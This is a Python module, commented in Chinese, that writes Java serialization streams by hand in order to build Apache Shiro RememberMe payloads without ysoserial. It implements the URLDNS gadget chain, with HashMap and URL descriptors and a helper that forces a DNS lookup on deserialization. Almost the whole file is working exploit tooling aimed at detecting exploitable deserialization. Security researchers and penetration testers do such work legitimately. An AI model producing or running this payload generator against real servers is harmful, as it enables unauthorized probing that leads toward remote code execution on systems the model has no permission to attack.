#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""极简 Java 原生序列化（ObjectOutputStream 格式）写入器。

用途：不依赖 ysoserial / JDK 生成 Shiro RememberMe 需要的 payload 字节流。
当前实现了 URLDNS 链所需的子集：TC_OBJECT / TC_CLASSDESC / TC_STRING /
TC_BLOCKDATA / TC_NULL / TC_REFERENCE 的读取不需要，写入时不生成引用
（重复对象直接重复写，Java 端完全允许，代价只是 payload 稍大）。

格式参考：Java Object Serialization Specification, Chapter 6。
"""

from __future__ import annotations

import struct
from dataclasses import dataclass, field as dc_field
from typing import Any, Callable, Iterable

STREAM_MAGIC = b"\xac\xed"
STREAM_VERSION = b"\x00\x05"

TC_NULL = 0x70
TC_REFERENCE = 0x71
TC_CLASSDESC = 0x72
TC_OBJECT = 0x73
TC_STRING = 0x74
TC_ARRAY = 0x75
TC_CLASS = 0x76
TC_BLOCKDATA = 0x77
TC_ENDBLOCKDATA = 0x78
TC_LONGSTRING = 0x7C

SC_WRITE_METHOD = 0x01
SC_SERIALIZABLE = 0x02
SC_EXTERNALIZABLE = 0x04

PRIMITIVE_SIZES = {"B": 1, "C": 2, "D": 8, "F": 4, "I": 4, "J": 8, "S": 2, "Z": 1}


@dataclass
class ClassDesc:
    """一个类的序列化描述符。"""

    name: str
    suid: int
    fields: list[tuple[str, str, str | None]] = dc_field(default_factory=list)
    # fields: (类型码, 字段名, 类名) —— 类型码 'L'/'[' 时第三项为类型描述
    flags: int = SC_SERIALIZABLE
    super_desc: "ClassDesc | None" = None

    def add(self, typecode: str, name: str, classname: str | None = None):
        self.fields.append((typecode, name, classname))
        return self


@dataclass
class JObject:
    """待写入的一个 Java 对象实例。"""

    desc: ClassDesc
    values: dict[str, Any] = dc_field(default_factory=dict)
    # 自定义 writeObject 数据回调：接收 writer，自行写入字节
    custom_writer: Callable[["JavaWriter"], None] | None = None


@dataclass
class JArray:
    array_type: str          # 例如 "[B"、"[Ljava.lang.Object;"
    items: list[Any]
    element_writer: Callable[["JavaWriter", Any], None] | None = None


def _modified_utf8(text: str) -> bytes:
    # 对 ASCII 目标域名足够；非 ASCII 走标准 UTF-8（Java 的 modified UTF-8
    # 与标准 UTF-8 仅在 NUL/增补字符上有差异，域名不会出现）
    return text.encode("utf-8")


class JavaWriter:
    """按 Java 序列化协议拼字节流。"""

    def __init__(self, with_header: bool = True):
        self.out = bytearray(STREAM_MAGIC + STREAM_VERSION if with_header else b"")

    # -- 基础写入 ---------------------------------------------------------- #
    def raw(self, data: bytes) -> "JavaWriter":
        self.out += data
        return self

    def u1(self, value: int) -> "JavaWriter":
        self.out.append(value & 0xFF)
        return self

    def i4(self, value: int) -> "JavaWriter":
        self.out += struct.pack(">i", value)
        return self

    def i8(self, value: int) -> "JavaWriter":
        self.out += struct.pack(">q", value)
        return self

    def f4(self, value: float) -> "JavaWriter":
        self.out += struct.pack(">f", value)
        return self

    # -- 字符串 ------------------------------------------------------------ #
    def write_string(self, text: str) -> "JavaWriter":
        data = _modified_utf8(text)
        if len(data) > 0xFFFF:
            self.u1(TC_LONGSTRING).i8(len(data)).raw(data)
        else:
            self.u1(TC_STRING).out += struct.pack(">H", len(data))
            self.out += data
        return self

    # -- 类描述符 ---------------------------------------------------------- #
    def write_class_desc(self, desc: ClassDesc | None) -> "JavaWriter":
        if desc is None:
            return self.u1(TC_NULL)
        self.u1(TC_CLASSDESC)
        self.write_utf(desc.name)
        self.i8(desc.suid)
        self.u1(desc.flags)
        self.out += struct.pack(">H", len(desc.fields))
        for typecode, name, classname in desc.fields:
            self.out.append(ord(typecode))
            self.write_utf(name)
            if typecode in ("L", "["):
                # 字段类型的类名以 TC_STRING 形式写在描述符里
                self.write_string(classname or "Ljava/lang/Object;")
        self.u1(TC_ENDBLOCKDATA)          # classAnnotation
        self.write_class_desc(desc.super_desc)
        return self

    def write_utf(self, text: str) -> "JavaWriter":
        data = _modified_utf8(text)
        if len(data) > 0xFFFF:
            raise ValueError("类名/字段名过长")
        self.out += struct.pack(">H", len(data))
        self.out += data
        return self

    # -- 对象 -------------------------------------------------------------- #
    def write_object(self, obj: JObject) -> "JavaWriter":
        self.u1(TC_OBJECT)
        self.write_class_desc(obj.desc)
        # 按描述符顺序写字段值
        for typecode, name, _classname in obj.desc.fields:
            if name not in obj.values:
                raise KeyError(f"对象 {obj.desc.name} 缺少字段 {name}")
            self.write_field(typecode, obj.values[name])
        if obj.desc.flags & SC_WRITE_METHOD:
            if obj.custom_writer is not None:
                obj.custom_writer(self)
            self.u1(TC_ENDBLOCKDATA)
        return self

    def write_field(self, typecode: str, value: Any) -> "JavaWriter":
        if typecode == "B":
            self.out += struct.pack(">b", value)
        elif typecode == "Z":
            self.out.append(1 if value else 0)
        elif typecode == "S":
            self.out += struct.pack(">h", value)
        elif typecode == "C":
            self.out += struct.pack(">H", value)
        elif typecode == "I":
            self.i4(value)
        elif typecode == "J":
            self.i8(value)
        elif typecode == "F":
            self.f4(value)
        elif typecode == "D":
            self.out += struct.pack(">d", value)
        elif typecode in ("L", "["):
            self.write_value(value)
        else:
            raise ValueError(f"未知字段类型: {typecode}")
        return self

    def write_value(self, value: Any) -> "JavaWriter":
        if value is None:
            return self.u1(TC_NULL)
        if isinstance(value, JObject):
            return self.write_object(value)
        if isinstance(value, JArray):
            return self.write_array(value)
        if isinstance(value, str):
            return self.write_string(value)
        if isinstance(value, (bytes, bytearray)):
            raise TypeError("字节数组请使用 JArray('[B', ...)")
        raise TypeError(f"无法序列化的值: {type(value)!r}")

    # -- 数组 -------------------------------------------------------------- #
    def write_array(self, arr: JArray) -> "JavaWriter":
        desc = ClassDesc(name=arr.array_type, suid=0, fields=[], flags=SC_SERIALIZABLE)
        self.u1(TC_ARRAY)
        self.write_class_desc(desc)
        self.i4(len(arr.items))
        for item in arr.items:
            if arr.element_writer is not None:
                arr.element_writer(self, item)
            elif arr.array_type == "[B":
                self.u1(item)
            else:
                self.write_value(item)
        return self

    # -- 自定义数据块 ------------------------------------------------------ #
    def blockdata(self, data: bytes) -> "JavaWriter":
        if not data:
            return self
        pos = 0
        while pos < len(data):
            chunk = data[pos:pos + 0xFF]
            self.u1(TC_BLOCKDATA).u1(len(chunk)).raw(chunk)
            pos += len(chunk)
        return self

    def bytes(self) -> bytes:
        return bytes(self.out)


# --------------------------------------------------------------------------- #
# 常用类描述符（字段顺序与 HotSpot 的实际输出保持一致，便于对比）
# --------------------------------------------------------------------------- #

HASHMAP_DESC = (
    ClassDesc("java.util.HashMap", 362498820763181265,
              flags=SC_SERIALIZABLE | SC_WRITE_METHOD)
    .add("F", "loadFactor")
    .add("I", "threshold")
)

URL_DESC = (
    ClassDesc("java.net.URL", -7627629688361524110,
              flags=SC_SERIALIZABLE | SC_WRITE_METHOD)
    .add("I", "hashCode")
    .add("I", "port")
    .add("L", "authority", "Ljava/lang/String;")
    .add("L", "file", "Ljava/lang/String;")
    .add("L", "host", "Ljava/lang/String;")
    .add("L", "protocol", "Ljava/lang/String;")
    .add("L", "ref", "Ljava/lang/String;")
)

STRING_DESC = ClassDesc("java.lang.String", -6849794470754667710,
                        flags=SC_SERIALIZABLE | SC_WRITE_METHOD)


def url_object(url: str, host: str, port: int = -1, protocol: str = "http",
               file: str = "/x") -> JObject:
    """构造一个 hashCode=-1 的 java.net.URL 对象（反序列化后 hashCode() 时触发 DNS）。"""
    authority = host if port in (-1, None) else f"{host}:{port}"
    return JObject(
        URL_DESC,
        {
            "hashCode": -1,
            "port": -1 if port in (-1, None) else port,
            "authority": authority,
            "file": file,
            "host": host,
            "protocol": protocol,
            "ref": None,
        },
    )
